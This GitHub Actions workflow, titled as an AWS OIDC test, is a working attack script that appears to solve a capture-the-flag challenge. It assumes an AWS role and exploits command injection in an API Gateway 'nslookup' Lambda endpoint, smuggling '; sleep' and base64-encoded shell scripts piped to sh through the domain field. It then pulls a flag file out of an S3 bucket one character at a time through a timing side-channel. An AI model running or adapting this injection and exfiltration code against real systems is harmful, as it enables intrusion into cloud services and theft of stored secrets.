name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Exfiltrate Flag via Timing Side-Channel
        run: |
          URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
          
          echo "=== STEP 1: CALIBRATE LAMBDA TIMEOUT ==="
          for i in 1 2 3; do
            START=$(date +%s%N)
            CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
              -H "Content-Type: application/json" \
              -d "{\"domain\": \"127.0.0.1; sleep $i\"}")
            END=$(date +%s%N)
            DURATION_MS=$(( (END - START) / 1000000 ))
            echo "sleep $i -> HTTP $CODE in ${DURATION_MS}ms"
          done
          
          echo ""
          echo "=== STEP 2: MEASURE BASELINE (S3 read, no sleep) ==="
          # This condition is always FALSE for printable ASCII (max 126), so no sleep fires
          SCRIPT='FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1); CHAR=$(echo "$FLAG" | cut -c1); ORD=$(echo -n "$CHAR" | od -An -tuC | tr -d " \n"); if [ "$ORD" -gt 200 ]; then sleep 2; fi'
          ENCODED=$(echo "$SCRIPT" | base64 -w0)
          START=$(date +%s%N)
          CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
          END=$(date +%s%N)
          BASELINE_MS=$(( (END - START) / 1000000 ))
          echo "Baseline (no sleep) -> HTTP $CODE in ${BASELINE_MS}ms"
          THRESHOLD=$((BASELINE_MS + 1000))
          echo "Using threshold: ${THRESHOLD}ms (baseline + 1000ms)"
          
          echo ""
          echo "=== STEP 3: VERIFY S3 ACCESS (sleep if file is 16 bytes) ==="
          SCRIPT='SIZE=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1 | wc -c); if [ "$SIZE" -eq 16 ]; then sleep 2; fi'
          ENCODED=$(echo "$SCRIPT" | base64 -w0)
          START=$(date +%s%N)
          CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
          END=$(date +%s%N)
          DURATION_MS=$(( (END - START) / 1000000 ))
          echo "S3 size check -> HTTP $CODE in ${DURATION_MS}ms"
          if [ "$CODE" != "504" ] && [ "$CODE" != "503" ] && [ $DURATION_MS -lt $THRESHOLD ]; then
            echo "WARNING: S3 access may not be working! If the flag is NOT 16 bytes, or S3 is blocked, the extraction will fail."
          fi
          
          echo ""
          echo "=== STEP 4: BINARY SEARCH EXTRACTION (16 bytes) ==="
          FLAG=""
          for pos in $(seq 1 16); do
            low=32
            high=126
            while [ $low -lt $high ]; do
              mid=$(( (low + high) / 2 ))
              
              # Build the shell script to run inside Lambda
              # $pos and $mid are expanded by GitHub bash; $FLAG/$CHAR/$ORD are literal for the Lambda shell
              SCRIPT='FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1); CHAR=$(echo "$FLAG" | cut -c'"$pos"'); ORD=$(echo -n "$CHAR" | od -An -tuC | tr -d " \n"); if [ "$ORD" -gt '"$mid"' ]; then sleep 2; fi'
              ENCODED=$(echo "$SCRIPT" | base64 -w0)
              
              START=$(date +%s%N)
              CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
                -H "Content-Type: application/json" \
                -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
              END=$(date +%s%N)
              DURATION_MS=$(( (END - START) / 1000000 ))
              
              # TRUE if Lambda timed out (504) OR took longer than baseline + 1s
              if [ "$CODE" = "504" ] || [ "$CODE" = "503" ] || [ $DURATION_MS -ge $THRESHOLD ]; then
                low=$((mid + 1))
                echo "  pos $pos > $mid  (time=${DURATION_MS}ms, code=$CODE)"
              else
                high=$mid
                echo "  pos $pos <= $mid (time=${DURATION_MS}ms, code=$CODE)"
              fi
            done
            CHAR=$(python3 -c "import sys; sys.stdout.write(chr($low))")
            FLAG="$FLAG$CHAR"
            echo ">>> Position $pos: '$CHAR' (ASCII $low) | Flag so far: $FLAG"
          done
          
          echo ""
          echo "==================== FINAL FLAG ===================="
          echo "$FLAG"
          echo "===================================================="
